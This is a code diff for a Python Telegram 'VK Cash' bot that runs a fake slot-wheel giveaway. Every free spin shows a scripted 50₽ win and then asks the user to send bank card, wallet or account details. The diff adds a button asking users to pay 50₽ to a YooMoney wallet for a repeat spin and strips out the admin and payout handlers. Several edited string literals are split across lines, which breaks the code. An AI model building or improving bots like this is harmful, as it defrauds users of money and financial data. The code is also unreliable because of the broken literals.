@@ -1,3 +1,4 @@
+
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from flask import Flask, request
@@ -66,13 +67,15 @@ def get_main_markup(user_id):
     markup.add(InlineKeyboardButton("📜 Правила", callback_data="rules"),
                InlineKeyboardButton("❓ FAQ", callback_data="faq"))
     markup.add(InlineKeyboardButton("📋 Политика", callback_data="policy"))
+    markup.add(InlineKeyboardButton("💵 Оплатить повторную прокрутку 50₽", url="https://yoomoney.ru/to/4100119077541618"))
     if user_id == ADMIN_ID:
         markup.add(InlineKeyboardButton("👑 Админ-панель", callback_data="admin"))
     return markup
 
 @bot.message_handler(commands=['start'])
 def send_start(message):
-    bot.send_message(message.chat.id, "🎰 Добро пожаловать в VK Cash!\nВыбирай действие ниже:", reply_markup=get_main_markup(message.from_user.id))
+    bot.send_message(message.chat.id, "🎰 Добро пожаловать в VK Cash!
+Выбирай действие ниже:", reply_markup=get_main_markup(message.from_user.id))
 
 @bot.callback_query_handler(func=lambda call: call.data == "free_spin")
 def handle_spin(call):
@@ -80,107 +83,20 @@ def handle_spin(call):
     if first_spin_done.get(uid):
         bot.answer_callback_query(call.id, "Бесплатная попытка уже использована.")
         return
-
     first_spin_done[uid] = True
     amount = 50
-
-    msg = bot.send_message(call.message.chat.id, "🔄 Крутим колесо...\n[ 🎰 🎰 🎰 ]")
+    msg = bot.send_message(call.message.chat.id, "🔄 Крутим колесо...
+[ 🎰 🎰 🎰 ]")
     time.sleep(1)
     bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍋 🍒 💣 ]")
     time.sleep(1)
     bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍉 💰 💣 ]")
     time.sleep(1)
     bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍀 💰 🍒 ]")
-
     code = generate_code(amount, uid)
     user_states[uid] = {"amount": amount, "code": code}
     message_text = f"🎉 *ПОБЕДА {amount}₽!* 🎉\n🎫 Код: `{code}`\n\n💳 Отправьте свои реквизиты:\n— Номер карты (Сбербанк, Тинькофф)\n— Или кошелёк (ЮMoney, Payeer, PayPal)\n— Или банк + номер счёта"
     bot.send_message(call.message.chat.id, message_text, parse_mode="Markdown")
-
-@bot.callback_query_handler(func=lambda call: call.data == "shop")
-def open_shop(call):
-    with open(VKCOIN_FILE, "r") as f:
-        coins = json.load(f)
-    user_coins = coins.get(str(call.from_user.id), 0)
-    markup = InlineKeyboardMarkup()
-    if user_coins >= 10:
-        markup.add(InlineKeyboardButton("🎰 Повторная попытка (10 VKC)", callback_data="buy_retry"))
-    bot.send_message(call.message.chat.id, f"🛒 Магазин VK Coins:\nУ тебя {user_coins} VKC", reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: call.data == "buy_retry")
-def buy_retry(call):
-    uid = call.from_user.id
-    with open(VKCOIN_FILE, "r") as f:
-        coins = json.load(f)
-    if coins.get(str(uid), 0) >= 10:
-        coins[str(uid)] -= 10
-        first_spin_done[uid] = False
-        with open(VKCOIN_FILE, "w") as f:
-            json.dump(coins, f, indent=4)
-        bot.send_message(uid, "✅ Повторная попытка активирована! Крути снова.")
-    else:
-        bot.send_message(uid, "❌ Недостаточно VK Coins.")
-
-@bot.callback_query_handler(func=lambda call: call.data == "leaderboard")
-def leaderboard(call):
-    top = get_leaderboard()
-    text = "🏆 Топ участников по выигрышам:\n"
-    for i, (uid, amount) in enumerate(top, 1):
-        text += f"{i}. ID {uid} — {amount}₽\n"
-    bot.send_message(call.message.chat.id, text)
-
-@bot.callback_query_handler(func=lambda call: call.data == "admin")
-def show_admin_panel(call):
-    if call.from_user.id != ADMIN_ID:
-        bot.answer_callback_query(call.id, "⛔ Нет доступа.")
-        return
-    markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("📦 Список кодов", callback_data="admin_codes"))
-    markup.add(InlineKeyboardButton("💾 Скачать codes.json", callback_data="admin_download"))
-    markup.add(InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"))
-    bot.send_message(call.message.chat.id, "👑 Админ-панель:", reply_markup=markup)
-
-@app.route('/', methods=['GET', 'POST'])
-def webhook():
-    if request.method == 'POST':
-        update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
-        bot.process_new_updates([update])
-        return 'OK', 200
-    return 'Bot is running!', 200
-
-@bot.callback_query_handler(func=lambda call: call.data in ["rules", "faq", "policy"])
-def handle_info(call):
-    info = {
-        "rules": "📜 *Правила участия:*\n- Первая прокрутка — бесплатная\n- Повторная — вручную после доната\n- Суммы бонусов — от 50₽ до 500₽\n- После оплаты — случайный результат",
-        "faq": "❓ *FAQ:*\n- *Как сыграть?* Нажми 'Крутить'\n- *Как снова сыграть?* Пока вручную, жди обновлений\n- *Как получить бонус?* Забери код и отправь реквизиты",
-        "policy": "📋 *Политика:*\n- Проект — развлекательный\n- Результаты случайны\n- Возврата нет\n- Участие добровольное"
-    }
-    bot.send_message(call.message.chat.id, info[call.data], parse_mode="Markdown")
-
-@bot.callback_query_handler(func=lambda call: call.data in ["admin_codes", "admin_download", "admin_stats"])
-def handle_admin_actions(call):
-    if call.from_user.id != ADMIN_ID:
-        bot.answer_callback_query(call.id, "⛔ Нет доступа.")
-        return
-
-    if call.data == "admin_codes":
-        with open(CODES_FILE, "r") as f:
-            codes = json.load(f)
-        text = "\n".join([f"{code} — {data['amount']}₽ — {'✅' if data['used'] else '🕓'}" for code, data in codes.items()])
-        bot.send_message(call.message.chat.id, f"📦 Активные коды:\n{text[:4000]}")
-
-    elif call.data == "admin_download":
-        with open(CODES_FILE, "rb") as f:
-            bot.send_document(call.message.chat.id, f)
-
-    elif call.data == "admin_stats":
-        with open(CODES_FILE, "r") as f:
-            codes = json.load(f)
-        total = len(codes)
-        used = sum(1 for x in codes.values() if x['used'])
-        pending = total - used
-        bot.send_message(call.message.chat.id, f"📊 Статистика:\nВсего кодов: {total}\nВыплачено: {used}\nОжидают: {pending}")
-
 
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
@@ -199,7 +115,6 @@ def handle_message(message):
         if codes[code]["user_id"] != uid:
             bot.send_message(uid, "⛔ Этот код не принадлежит вам.")
             return
-
         payout_info = (
             f"💰 Новая заявка от @{message.from_user.username or message.from_user.first_name}:\n"
             f"🆔 ID: {uid}\n"
@@ -208,11 +123,9 @@ def handle_message(message):
             f"💳 Реквизиты: {message.text}"
         )
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("💸 Выплатить", callback_data=f"pay_{uid}_{code}"))
+        markup.add(InlineKeyboardButton("💸 Выплатить вручную", url="https://yoomoney.ru/main"))
         bot.send_message(ADMIN_ID, payout_info, reply_markup=markup)
-
         bot.send_message(uid, "✅ Заявка принята!\n⏳ Ожидайте выплату в течение 1 часа.")
-
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
